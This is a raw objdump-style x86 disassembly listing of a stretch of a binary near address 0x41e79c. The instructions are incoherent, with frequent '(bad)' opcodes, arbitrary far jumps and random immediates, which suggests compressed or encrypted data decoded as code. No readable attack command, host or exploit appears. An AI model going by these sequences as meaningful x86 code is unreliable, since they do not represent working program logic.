  41e79c:	sti    
  41e79d:	sub    ah,ch
  41e79f:	lahf   
  41e7a0:	scas   eax,DWORD PTR es:[edi]
  41e7a1:	addr16 cmp eax,0xcc0ec452
  41e7a7:	nop
  41e7a8:	dec    eax
  41e7a9:	dec    ebx
  41e7aa:	cmp    al,0x21
  41e7ac:	xchg   edi,eax
  41e7ad:	adc    al,0xac
  41e7af:	mov    dh,0xb2
  41e7b1:	int    0x66
  41e7b3:	aas    
  41e7b4:	das    
  41e7b5:	ficomp DWORD PTR [eax+ebx*1]
  41e7b8:	test   eax,0x396c4931
  41e7bd:	shl    DWORD PTR [ebx-0x11],cl
  41e7c0:	xor    al,0x66
  41e7c2:	mov    al,0xa5
  41e7c4:	lods   eax,DWORD PTR ds:[esi]
  41e7c5:	add    al,0x23
  41e7c7:	and    eax,0xe2d8f8bc
  41e7cc:	jecxz  0x41e7e4
  41e7ce:	rcr    DWORD PTR [ebx],1
  41e7d0:	mov    WORD PTR [esi],gs
  41e7d2:	js     0x41e773
  41e7d4:	loop   0x41e845
  41e7d6:	rol    DWORD PTR [eax-0x7a],0xea
  41e7da:	(bad)  
  41e7db:	(bad)  
  41e7dd:	push   0x16
  41e7df:	cmp    DWORD PTR [ecx+0x38],0xffffff87
  41e7e3:	cmp    eax,0xd5e213a1
  41e7e8:	mov    edx,DWORD PTR [ebp+0x1edbaa81]
  41e7ee:	imul   BYTE PTR [eax-0x296eb19b]
  41e7f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f5:	mov    ebp,DWORD PTR [edi]
  41e7f7:	enter  0xdb3,0xb5
  41e7fb:	inc    edi
  41e7fc:	mov    edi,0xef78ee3a
  41e801:	mov    ds:0x9790700b,eax
  41e806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e807:	test   al,0x2a
  41e809:	mov    ds:0xf78e5bfb,eax
  41e80e:	mov    ecx,0x1ad8
	...
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e871
  41e881:	sbb    BYTE PTR [ebp-0x6e],dl
  41e884:	adc    DWORD PTR [ebp+0x1],eax
  41e887:	add    BYTE PTR ds:0xe4000001,al
  41e88d:	jb     0x41e85f
  41e88f:	adc    dl,bh
  41e891:	adc    al,0xc9
  41e893:	and    BYTE PTR [edx+0x36e421ac],cl
  41e899:	xchg   edx,eax
  41e89a:	jp     0x41e84d
  41e89c:	sub    eax,0x32f2de3b
  41e8a1:	fisttp QWORD PTR [ebx-0x5122dc59]
  41e8a7:	ins    DWORD PTR es:[edi],dx
  41e8a8:	sub    edi,DWORD PTR ds:0xe5f8d7ca
  41e8ae:	xor    DWORD PTR [ebx+0xa],edi
  41e8b1:	add    ch,al
  41e8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8b4:	sub    al,0x69
  41e8b6:	aam    0x95
  41e8b8:	mov    bh,0x3a
  41e8ba:	rcr    BYTE PTR [eax-0x7a],0x7b
  41e8be:	mov    BYTE PTR [ebx-0x2f906b4a],bl
  41e8c4:	loopne 0x41e941
  41e8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8c7:	and    bl,bh
  41e8c9:	and    al,0x15
  41e8cb:	pop    ebp
  41e8cc:	and    BYTE PTR [esi-0x46],dh
  41e8cf:	std    
  41e8d0:	popa   
  41e8d1:	and    cl,BYTE PTR [ebx+0x13efd445]
  41e8d7:	sbb    DWORD PTR [eax],ebp
  41e8d9:	cmp    al,0xc0
  41e8db:	xor    bl,cl
  41e8dd:	cmc    
  41e8de:	retf   
  41e8df:	in     al,0x70
  41e8e1:	mov    ds:0xe4c6bc90,al
  41e8e6:	fild   QWORD PTR [esi-0x14203545]
  41e8ec:	dec    esp
  41e8ed:	inc    ebx
  41e8ee:	adc    edi,esp
  41e8f0:	lahf   
  41e8f1:	and    BYTE PTR [ebp+0x1cc1d6dd],dh
  41e8f7:	or     al,0x3
  41e8f9:	pushf  
  41e8fa:	pop    ecx
  41e8fb:	pop    es
  41e8fc:	push   DWORD PTR [ebx+0x49]
  41e8ff:	test   al,0xc1
  41e901:	sub    al,ah
  41e903:	pop    eax
  41e904:	lea    edx,[eax+0xb]
  41e907:	in     eax,0xb2
  41e909:	cli    
  41e90a:	stos   DWORD PTR es:[edi],eax
  41e90b:	add    eax,0x90592880
  41e910:	out    dx,al
  41e911:	into   
  41e912:	or     DWORD PTR [esp+esi*2-0x22],edx
  41e916:	fisubr WORD PTR [edi-0x63]
  41e919:	mov    dl,0xcd
  41e91b:	and    edi,0x61
  41e91e:	cs inc esp
  41e920:	jg     0x41e91a
  41e922:	mov    ecx,0x3f3ad58c
  41e927:	(bad)  
  41e928:	stc    
  41e929:	inc    ecx
  41e92a:	mov    edx,0x6acf959a
  41e92f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e930:	pop    ebp
  41e931:	ds pop ds
  41e933:	add    BYTE PTR [edx-0xc216a9e],0xe8
  41e93a:	sub    bh,BYTE PTR [ebx+esi*1]
  41e93d:	adc    eax,0xbbfd5b17
  41e942:	sbb    eax,DWORD PTR [ebx]
  41e944:	push   ds
  41e945:	outs   dx,DWORD PTR ds:[esi]
  41e946:	cmp    BYTE PTR [esi-0x7c683f4c],al
  41e94c:	fild   WORD PTR [edx-0x7d248036]
  41e952:	call   0x89f6aba3
  41e957:	sub    eax,0x420d1706
  41e95c:	mov    ch,0xf2
  41e95e:	stos   BYTE PTR es:[edi],al
  41e95f:	xchg   ecx,eax
  41e960:	mov    dl,BYTE PTR [eax-0x36]
  41e963:	add    bl,dl
  41e965:	pop    es
  41e966:	lock out dx,eax
  41e968:	lods   eax,DWORD PTR ds:[esi]
  41e969:	push   ecx
  41e96a:	push   esi
  41e96b:	(bad)  
  41e96c:	es and edi,ebp
  41e96f:	and    al,al
  41e971:	add    ebp,esi
  41e973:	mov    BYTE PTR [esi-0x28],cl
  41e976:	in     eax,0x3c
  41e978:	sub    BYTE PTR [eax-0x53],dl
  41e97b:	sbb    BYTE PTR [edi-0x7e],ah
  41e97e:	test   DWORD PTR ds:0xcc38e8c8,ebx
  41e984:	push   esp
  41e985:	pop    eax
  41e986:	cmp    al,0xad
  41e988:	ror    esp,1
  41e98a:	sahf   
  41e98b:	inc    ebp
  41e98c:	mov    ds:0x3ab92373,al
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	jge    0x41ea21
  41ea02:	pop    edx
  41ea03:	jmp    0x105:0x14616
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	xor    eax,0x4fcf1672
  41ea11:	dec    ebx
  41ea12:	sti    
  41ea13:	rcr    BYTE PTR [edi+0x2c],0x35
  41ea17:	cli    
  41ea18:	inc    edi
  41ea19:	(bad)  [ebx]
  41ea1b:	(bad)  
  41ea1c:	mov    eax,ds:0x14c55689
  41ea21:	mov    esi,DWORD PTR [eax-0x15]
  41ea24:	push   cs
  41ea25:	loopne 0x41e9f8
  41ea27:	inc    eax
  41ea28:	pusha  
  41ea29:	or     eax,0xd3b452e
  41ea2e:	in     al,dx
  41ea2f:	jmp    0x8fc2:0x9f024109
  41ea36:	test   BYTE PTR [ecx-0x49c737c3],al
  41ea3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea3d:	push   edi
  41ea3e:	xor    DWORD PTR [edi+0x305426],esi
  41ea44:	pop    eax
  41ea45:	out    0x24,al
  41ea47:	mov    cl,BYTE PTR [edx-0x4b48091d]
  41ea4d:	test   al,0x12
  41ea4f:	outs   dx,DWORD PTR ds:[esi]
  41ea50:	mov    eax,ds:0xfa9b8240
  41ea55:	idiv   DWORD PTR [ebp+ecx*2+0x2569b422]
  41ea5c:	call   FWORD PTR [edi-0x4164aae]
  41ea62:	push   ds
  41ea63:	sbb    dh,BYTE PTR ds:0x2f4292f0
  41ea69:	ja     0x41eae1
  41ea6b:	mov    bl,0x24
  41ea6d:	and    BYTE PTR [edx+edi*4+0x3b89c177],dl
  41ea74:	sub    ah,BYTE PTR [esi-0x2af45cbc]
  41ea7a:	cs cdq 
  41ea7c:	loop   0x41ea89
  41ea7e:	adc    eax,0x23d6f8c0
  41ea83:	jmp    0x1638:0x54bb44e8
  41ea8a:	mov    esi,0xa80df688
  41ea8f:	retf   0x3325
  41ea92:	mov    esp,ebx
  41ea94:	cdq    
  41ea95:	adc    al,0xb5
  41ea97:	push   ebp
  41ea98:	popa   
  41ea99:	jae    0x41eac1
  41ea9b:	push   0x2e
  41ea9d:	arpl   WORD PTR [ebx+0x1],bx
  41eaa0:	(bad)  
  41eaa2:	mov    al,0x16
  41eaa4:	cld    
  41eaa5:	(bad)  
  41eaa6:	lahf   
  41eaa7:	xchg   esp,eax
  41eaa8:	xor    eax,0xd1c347b4
  41eaad:	in     al,0x3b
  41eaaf:	mov    BYTE PTR [edx-0x431a8fc1],dl
  41eab5:	in     al,dx
  41eab6:	push   es
  41eab7:	sbb    DWORD PTR [ecx],ebp
  41eab9:	pushf  
  41eaba:	cmp    ecx,DWORD PTR ds:0xf949fcc8
  41eac0:	lods   eax,DWORD PTR ds:[esi]
  41eac1:	retf   0xd601
  41eac4:	xor    bh,BYTE PTR [ecx+0x5b]
  41eac7:	out    0x9c,eax
  41eac9:	adc    BYTE PTR [eax-0x56],dh
  41eacc:	in     eax,0xc0
  41eace:	stos   BYTE PTR es:[edi],al
  41eacf:	dec    esi
  41ead0:	xor    edx,DWORD PTR [ecx]
  41ead2:	dec    edx
  41ead3:	cmp    ebp,eax
  41ead5:	xor    BYTE PTR [edi-0x3],dh
  41ead8:	push   ebp
  41ead9:	mov    edi,ds
  41eadb:	pop    esi
  41eadc:	leave  
  41eadd:	lock xchg edi,eax
  41eadf:	test   al,0xe0
  41eae1:	jle    0x41eb05
  41eae3:	jns    0x41eae8
  41eae5:	in     al,dx
  41eae6:	push   esp
  41eae7:	dec    ebx
  41eae8:	retf   0xd7bc
  41eaeb:	dec    esi
  41eaec:	int    0x6e
  41eaee:	inc    ebp
  41eaef:	(bad)  
  41eaf0:	adc    eax,0x49cb435a
  41eaf5:	mov    ecx,0x43bf82ff
  41eafa:	ins    BYTE PTR es:[edi],dx
  41eafb:	fsubr  st(0),st
  41eafd:	adc    DWORD PTR [eax+0x45],0x8cf4ac11
  41eb04:	push   esi
  41eb05:	xor    bh,BYTE PTR [esi+0x14]
  41eb08:	(bad)  
  41eb09:	imul   ebp,DWORD PTR [ebx-0x469d11bf],0x3d
  41eb10:	mov    ds:0x0,al
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xef
  41eb81:	jne    0x41ebea
  41eb83:	sbb    DWORD PTR [ebx],ebx
  41eb85:	inc    edi
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0xb6000001
  41eb8d:	jmp    0x5282aa22
  41eb92:	pusha  
  41eb93:	jae    0x41eb25
  41eb95:	iret   
  41eb96:	dec    ebx
  41eb97:	mov    ebx,0x93efbcfa
  41eb9c:	push   ss
  41eb9d:	stos   BYTE PTR es:[edi],al
  41eb9e:	jns    0x41eb3d
  41eba0:	xor    BYTE PTR [edi-0x53],0xdb
  41eba4:	adc    edx,0xffffff85
  41eba7:	jb     0x41eb9a
  41eba9:	rcl    DWORD PTR [edi],1
  41ebab:	add    edi,ebx
  41ebad:	pop    edi
  41ebae:	mov    ecx,0x1b68611a
  41ebb3:	nop
  41ebb4:	pop    ecx
  41ebb5:	(bad)  
  41ebb6:	rcr    BYTE PTR [ebp+0x60],0x11
  41ebba:	dec    esp
  41ebbb:	jb     0x41ebe8
  41ebbd:	mov    ds:0xca8f3240,al
  41ebc2:	mov    edx,0xe16a2518
  41ebc7:	scas   eax,DWORD PTR es:[edi]
  41ebc8:	std    
  41ebc9:	shr    dh,0xf8
  41ebcc:	push   esi
  41ebcd:	xchg   DWORD PTR [eax-0x6c],ecx
  41ebd0:	xchg   BYTE PTR [eax-0x27],ah
  41ebd3:	icebp  
  41ebd4:	ds (bad) 
  41ebd6:	arpl   ax,si
  41ebd8:	(bad)  
  41ebd9:	test   eax,0xbd0986bb
  41ebde:	push   esi
  41ebdf:	push   es
  41ebe0:	xlat   BYTE PTR ds:[ebx]
  41ebe1:	xchg   ebp,eax
  41ebe2:	outs   dx,BYTE PTR ds:[esi]
  41ebe3:	sahf   
  41ebe4:	mov    ds:0x5773ad95,eax
  41ebe9:	inc    eax
  41ebea:	inc    edi
  41ebeb:	lock mov ebx,0xa6aeb8a5
  41ebf1:	popf   
  41ebf2:	jp     0x41ec45
  41ebf4:	dec    esi
  41ebf5:	mov    esi,DWORD PTR [edx+0x45]
  41ebf8:	dec    ecx
  41ebf9:	fldcw  WORD PTR [ecx+0x14f5f19b]
  41ebff:	mov    edi,0x42a754ee
  41ec04:	addr16 out 0x74,eax
  41ec07:	push   ebx
  41ec08:	ja     0x41ec5d
  41ec0a:	loop   0x41ec54
  41ec0c:	popf   
  41ec0d:	retf   
  41ec0e:	pop    ss
  41ec0f:	xchg   ebp,eax
  41ec10:	adc    DWORD PTR [edi-0x4e],esp
  41ec13:	in     eax,dx
  41ec14:	(bad)  
  41ec15:	mov    cl,0xa6
  41ec17:	mov    ecx,0xda23ee5d
  41ec1c:	repnz mov eax,ds:0xc4a7c3da
  41ec22:	daa    
  41ec23:	rcl    BYTE PTR [ecx-0x43],1
  41ec26:	cwde   
  41ec27:	mov    eax,0x59730ea7
  41ec2c:	dec    ebp
  41ec2d:	sub    bl,0xd5
  41ec30:	into   
  41ec31:	jge    0x41ec8f
  41ec33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec34:	test   eax,0x2f23e63e
  41ec39:	mov    ecx,0x939e5bc2
  41ec3e:	sub    DWORD PTR [esp+ecx*2+0x22b6f444],ebx
  41ec45:	push   es
  41ec46:	pop    esp
  41ec47:	out    dx,eax
  41ec48:	pop    ecx
  41ec49:	stc    
  41ec4a:	add    eax,0x58a50921
  41ec4f:	pop    edx
  41ec50:	jbe    0x41ec5d
  41ec52:	add    ebx,eax
  41ec54:	std    
  41ec55:	mov    ch,0x14
  41ec57:	xchg   edx,eax
  41ec58:	jp     0x41ec21
  41ec5a:	pop    ecx
  41ec5b:	stc    
  41ec5c:	and    bl,ch
  41ec5e:	shl    BYTE PTR [ebx],0x3a
  41ec61:	jmp    0x41ec9a
  41ec63:	scas   al,BYTE PTR es:[edi]
  41ec64:	aad    0x6f
  41ec66:	inc    ebx
  41ec67:	shr    BYTE PTR [esi+0x34f62ad9],1
  41ec6d:	stos   BYTE PTR es:[edi],al
  41ec6e:	pop    ebx
  41ec6f:	arpl   WORD PTR [ecx-0x7a],bp
  41ec72:	pop    esp
  41ec73:	bnd ret 
  41ec75:	rol    esi,0x56
  41ec78:	addr16 sbb al,0xb6
  41ec7b:	cwde   
  41ec7c:	cs mov ecx,0xbae98306
  41ec82:	shr    BYTE PTR [esi+0x3d81b945],1
  41ec88:	push   ss
  41ec89:	scas   eax,DWORD PTR es:[edi]
  41ec8a:	fwait
  41ec8b:	inc    eax
  41ec8c:	add    eax,0xbafdb5ba
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xc55b5fd0
  41ed02:	mov    esp,0x14820ca
  41ed07:	add    BYTE PTR ds:0xd3000001,al
  41ed0d:	bound  edx,QWORD PTR [edx]
  41ed0f:	jbe    0x41ed0c
  41ed11:	fmul   QWORD PTR [edx+0x407e7e9]
  41ed17:	dec    ebx
  41ed18:	push   esp
  41ed19:	xor    ecx,DWORD PTR [esi+esi*8-0x299886ac]
  41ed20:	clc    
  41ed21:	das    
  41ed22:	(bad)
  41ed25:	les    edi,FWORD PTR [edx-0x6d6b428d]
  41ed2b:	ror    bl,1
  41ed2d:	sub    edx,ecx
  41ed2f:	add    cl,dl
  41ed31:	sbb    ebp,DWORD PTR [edx-0x14]
  41ed34:	sub    al,0x91
  41ed36:	mov    eax,0xe5f2448e
  41ed3b:	aaa    
  41ed3c:	adc    DWORD PTR [ebx],esp
  41ed3e:	nop
  41ed3f:	adc    ecx,DWORD PTR [ecx+0x7ca2c9b1]
  41ed45:	mov    ds,WORD PTR [edi+esi*2]
  41ed48:	hlt    
  41ed49:	add    DWORD PTR [ebx+0x16411493],esp
  41ed4f:	in     eax,dx
  41ed50:	fcomp  QWORD PTR [eax]
  41ed52:	mov    ?,WORD PTR [ebp-0x42a9c0ac]
  41ed58:	aas    
  41ed59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed5a:	mov    esi,0x9892b0ff
  41ed5f:	js     0x41ed86
  41ed61:	das    
  41ed62:	mov    ecx,0xa36fbfc6
  41ed67:	dec    edi
  41ed68:	retf   0xc064
  41ed6b:	pop    ss
  41ed6c:	ror    DWORD PTR [ecx+ebx*4+0x5e538b84],0x11
  41ed74:	dec    edi
  41ed75:	xor    eax,0xfbe6e43b
  41ed7a:	test   DWORD PTR [ebp-0x67],ecx
  41ed7d:	jns    0x41ed78
  41ed7f:	push   0xffffffbe
  41ed81:	mov    bl,0x39
  41ed83:	add    BYTE PTR [edx-0x73d8f742],0xba
  41ed8a:	adc    DWORD PTR [edx+0x38],ecx
  41ed8d:	retf   
  41ed8e:	mov    ebx,0x342841f3
  41ed93:	stos   DWORD PTR es:[edi],eax
  41ed94:	daa    
  41ed95:	xor    DWORD PTR [edi+ebx*1],ebx
  41ed98:	cmp    dl,BYTE PTR [eax+esi*1]
  41ed9b:	ds ret 
  41ed9d:	sbb    eax,0xb803f7b6
  41eda2:	daa    
  41eda3:	int3   
  41eda4:	pop    ebx
  41eda5:	or     eax,0x16528cc9
  41edaa:	ja     0x41ed8d
  41edac:	call   0xbe97701f
  41edb1:	lods   al,BYTE PTR ds:[esi]
  41edb2:	sub    ebp,eax
  41edb4:	mov    bh,0x5f
  41edb6:	and    al,0x43
  41edb8:	mov    dh,0x94
  41edba:	pop    esp
  41edbb:	cld    
  41edbc:	shl    ebp,1
  41edbe:	je     0x41edf5
  41edc0:	inc    ebx
  41edc1:	push   eax
  41edc2:	xchg   BYTE PTR ds:0xf1a6fc1c,cl
  41edc8:	shr    DWORD PTR [ecx-0x50997f00],0xa0
  41edcf:	cmp    cl,BYTE PTR [edx+0x6e]
  41edd2:	gs out dx,eax
  41edd4:	jg     0x41ee23
  41edd6:	xchg   esp,eax
  41edd7:	push   eax
  41edd8:	or     BYTE PTR [eax],al
  41edda:	sub    BYTE PTR [esi],ah
  41eddc:	adc    DWORD PTR [edx+0x5a],ecx
  41eddf:	das    
  41ede0:	mov    eax,DWORD PTR [edi*4-0x71cb528c]
  41ede7:	ret    0x8903
  41edea:	fimul  WORD PTR ds:0x70db44cb
  41edf0:	addr16 push edi
  41edf2:	out    dx,al
  41edf3:	stc    
  41edf4:	xor    eax,ebx
  41edf6:	ret    
  41edf7:	adc    edx,esp
  41edf9:	inc    ebx
  41edfa:	(bad)  
  41edfb:	nop
  41edfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edfd:	mov    edx,0x6eb9deec
  41ee02:	and    DWORD PTR [edx-0x2],esp
  41ee05:	add    ebp,DWORD PTR [edx]
  41ee07:	inc    esi
  41ee08:	arpl   WORD PTR [ebx-0x55],ax
  41ee0b:	mov    bl,0x51
  41ee0d:	jmp    0x0:0x926fba
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x2519:0xb81941e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x93000001
  41ee8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee8e:	sahf   
  41ee8f:	and    eax,DWORD PTR [edi]
  41ee91:	and    eax,0x508084be
  41ee96:	int    0xab
  41ee98:	jmp    0x69aa:0xb00644a2
  41ee9f:	lahf   
  41eea0:	adc    al,0x48
  41eea2:	sti    
  41eea3:	adc    DWORD PTR [ebp-0x3c31a922],ebp
  41eea9:	mov    eax,0xfb95649c
  41eeae:	nop
  41eeaf:	int3   
  41eeb0:	adc    esp,edx
  41eeb2:	mov    edx,0x72edeb90
  41eeb7:	int    0x8f
  41eeb9:	out    0x3b,al
  41eebb:	shl    DWORD PTR fs:0x57c8de2b,cl
  41eec2:	in     eax,dx
  41eec3:	sbb    al,0xc1
  41eec5:	push   ds
  41eec6:	mov    dl,bh
  41eec8:	adc    ecx,DWORD PTR [ebp+0xb]
  41eecb:	push   cs
  41eecc:	pop    esp
  41eecd:	or     al,0x7b
  41eecf:	arpl   WORD PTR [edi-0x69],dx
  41eed2:	pop    esp
  41eed3:	mov    esi,0xece521d2
  41eed8:	xchg   BYTE PTR [ebp+0x5d],dl
  41eedb:	popa   
  41eedc:	sub    eax,0x5f23358c
  41eee1:	xchg   edi,esp
  41eee3:	sub    bh,bl
  41eee5:	mov    dl,0xda
  41eee7:	mov    esi,0x3acbfc8b
  41eeec:	xchg   BYTE PTR [edx+ebp*1-0x3ec2a0d1],dh
  41eef3:	imul   edx,eax,0x4a
  41eef6:	xlat   BYTE PTR ds:[ebx]
  41eef7:	mov    dh,0x99
  41eef9:	not    BYTE PTR [eax]
  41eefb:	add    eax,0xa247fbd9
  41ef00:	mov    ebp,0xe61aebe9
  41ef05:	mov    es,WORD PTR [esi-0x18d61c1b]
  41ef0b:	push   edi
  41ef0c:	xchg   esi,eax
  41ef0d:	mov    ch,0x5b
  41ef0f:	test   DWORD PTR [esi],0x58fe6f8f
  41ef15:	cmp    eax,0xf8ba3ae5
  41ef1a:	add    bh,BYTE PTR [eax]
  41ef1c:	adc    al,cl
  41ef1e:	add    DWORD PTR [esi],edi
  41ef20:	or     al,0x29
  41ef22:	inc    ebp
  41ef23:	mov    ah,0x75
  41ef25:	jecxz  0x41ef13
  41ef27:	inc    ecx
  41ef28:	dec    edi
  41ef29:	ja     0x41eeb1
  41ef2b:	push   es
  41ef2c:	cmp    DWORD PTR ds:0x9097eb7,0xfffffffb
  41ef33:	add    edi,edx
  41ef35:	jle    0x41ef1f
  41ef37:	jno    0x41ef38
  41ef39:	add    eax,0xb75b0ec7
  41ef3e:	aam    0xb0
  41ef40:	mov    dl,0xe8
  41ef42:	adc    eax,0xaaa43401
  41ef47:	cs in  eax,0x9
  41ef4a:	lods   eax,DWORD PTR ds:[esi]
  41ef4b:	loop   0x41efac
  41ef4d:	jae    0x41ef75
  41ef4f:	lods   eax,DWORD PTR ds:[esi]
  41ef50:	fwait
  41ef51:	jmp    0x278b3a40
  41ef56:	inc    edi
  41ef57:	les    edx,FWORD PTR [ecx+0x3d9d37fc]
  41ef5d:	ret    
  41ef5e:	lods   al,BYTE PTR ds:[esi]
  41ef5f:	(bad)  
  41ef60:	sub    DWORD PTR [eax+eiz*4],ecx
  41ef63:	cmp    bh,dl
  41ef65:	pop    es
  41ef66:	ret    
  41ef67:	cmp    ah,BYTE PTR [ebp-0x45]
  41ef6a:	or     bl,BYTE PTR [ebx+0x283cbb7e]
  41ef70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef71:	nop
  41ef72:	xchg   edi,edx
  41ef74:	in     eax,0x65
  41ef76:	jnp    0x41ef90
  41ef78:	int3   
  41ef79:	mov    edi,0x7ebdaf6b
  41ef7e:	shl    BYTE PTR [eax+ebp*8-0x710a9f07],0x17
  41ef86:	mov    esi,0xfb7ee2af
  41ef8b:	mov    dh,0xd8
  41ef8d:	fbstp  TBYTE PTR [eax-0x33]
  41ef90:	enter  0x0,0x0
	...
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ecx,edx,0xb
  41f002:	in     al,dx
  41f003:	dec    ebx
  41f004:	sub    cl,BYTE PTR [edx+0x1]
  41f007:	add    BYTE PTR ds:0x9f000001,al
  41f00d:	inc    esi
  41f00e:	mov    DWORD PTR [ebp-0x77514adb],esi
  41f014:	iret   
  41f015:	lds    eax,FWORD PTR [eax]
  41f017:	dec    BYTE PTR [ebx-0x39f32986]
  41f01d:	ja     0x41f02a
  41f01f:	in     eax,0xb6
  41f021:	rcr    DWORD PTR [ecx],1
  41f023:	inc    eax
  41f024:	das    
  41f025:	sbb    al,0x10
  41f027:	out    0x80,eax
  41f029:	ins    DWORD PTR es:[edi],dx
  41f02a:	sbb    eax,0x3e5818b0
  41f02f:	push   ds
  41f030:	adc    bh,ah
  41f032:	and    DWORD PTR [ecx-0x79],ebp
  41f035:	xchg   ebp,ecx
  41f037:	push   0xffffffb5
  41f039:	push   cs
  41f03a:	mov    cl,0xfc
  41f03c:	mov    dh,0x29
  41f03e:	jae    0x41f0b0
  41f040:	iret   
  41f041:	dec    ecx
  41f042:	repnz shr BYTE PTR [ebx+0x6fdefde7],cl
  41f049:	cmp    BYTE PTR [ebx+0x2e],bl
  41f04c:	fstp   DWORD PTR [edi+0x7c]
  41f04f:	cli    
  41f050:	(bad)  
  41f051:	lock stos DWORD PTR es:[edi],eax
  41f053:	xchg   DWORD PTR [ebp+0x1bb47923],esi
  41f059:	mov    esp,0xf7ca032b
  41f05e:	addr16 fs mov dh,ch
  41f062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f064:	fild   DWORD PTR [edx+0x2ff3f350]
  41f06a:	test   BYTE PTR [ebp-0x43],dh
  41f06d:	ficomp WORD PTR ds:0x91fc507d
  41f073:	(bad)  
  41f077:	stc    
  41f078:	sbb    DWORD PTR [eax],0xffffff96
  41f07b:	mov    al,0xdc
  41f07d:	hlt    
  41f07e:	retf   
  41f07f:	dec    edx
  41f080:	pop    esi
  41f081:	mov    ah,0xdb
  41f083:	repnz aaa 
  41f085:	mov    edx,0xa6780334
  41f08a:	jmp    0xa41:0x73fbf567
  41f091:	or     al,0x96
  41f093:	sahf   
  41f094:	fmul   DWORD PTR [ebp+0x3f]
  41f097:	mov    ds:0xfb5646a9,eax
  41f09c:	xchg   ebp,eax
  41f09d:	jne    0x41f05b
  41f09f:	jmp    0x41f108
  41f0a1:	hlt    
  41f0a2:	sbb    al,0xfb
  41f0a4:	das    
  41f0a5:	das    
  41f0a6:	(bad)
  41f0a9:	jp     0x41f0f9
  41f0ab:	ret    
  41f0ac:	push   es
  41f0ad:	cmp    ch,bl
  41f0af:	out    0xf7,eax
  41f0b1:	xor    DWORD PTR [ebp-0xbe4b4f],0x20bde85
  41f0bb:	mov    eax,ds:0xf87f314c
  41f0c0:	into   
  41f0c1:	sbb    DWORD PTR [edi],eax
  41f0c3:	mov    BYTE PTR [ecx],al
  41f0c5:	pop    es
  41f0c6:	push   ss
  41f0c7:	inc    edx
  41f0c8:	aaa    
  41f0c9:	xor    BYTE PTR [eax],dh
  41f0cb:	inc    edx
  41f0cc:	ror    DWORD PTR [eax-0x67],0x68
  41f0d0:	cmc    
  41f0d1:	cdq    
  41f0d2:	test   eax,0x40478460
  41f0d7:	ins    DWORD PTR es:[edi],dx
  41f0d8:	fld    DWORD PTR [eax]
  41f0da:	mov    al,0x39
  41f0dc:	aad    0x1
  41f0de:	shl    BYTE PTR [eax],cl
  41f0e0:	and    ch,BYTE PTR [edx+0x35]
  41f0e3:	mov    ds:0x3e4c117c,eax
  41f0e8:	out    dx,eax
  41f0e9:	dec    ecx
  41f0ea:	jge    0x41f0e5
  41f0ec:	in     eax,dx
  41f0ed:	test   al,0x30
  41f0ef:	enter  0xd6e9,0x58
  41f0f3:	inc    edx
  41f0f4:	pop    eax
  41f0f5:	or     al,0x31
  41f0f8:	test   DWORD PTR [edx],0xc54db11e
  41f0fe:	cmp    BYTE PTR [edx+edx*2-0x29808dbd],bl
  41f105:	ja     0x41f0b2
  41f107:	cmovl  edx,DWORD PTR [ecx-0x28e9c66]
  41f10e:	scas   al,BYTE PTR es:[edi]
  41f10f:	push   0x63
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x64f762af
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x2d000001
  41f18d:	pop    esp
  41f18e:	inc    ebx
  41f18f:	bound  ebx,QWORD PTR [ebx-0x3fd4fae8]
  41f195:	aam    0xbb
  41f197:	test   al,0x3
  41f199:	iret   
  41f19a:	inc    eax
  41f19b:	retf   0xecbb
  41f19e:	lahf   
  41f19f:	mov    BYTE PTR [edx+0x1cfa1371],dl
  41f1a5:	xchg   DWORD PTR [edx-0x27],edi
  41f1a8:	in     eax,0x8d
  41f1aa:	xchg   bl,al
  41f1ac:	jmp    0x9778f662
  41f1b1:	inc    ebp
  41f1b2:	int    0x6b
  41f1b4:	inc    edx
  41f1b5:	xor    edx,eax
  41f1b7:	rol    BYTE PTR [esi-0x38aaf1],cl
  41f1bd:	call   0xfa7e4178
  41f1c2:	bound  edx,QWORD PTR [eax+0x8]
  41f1c5:	xchg   ebx,eax
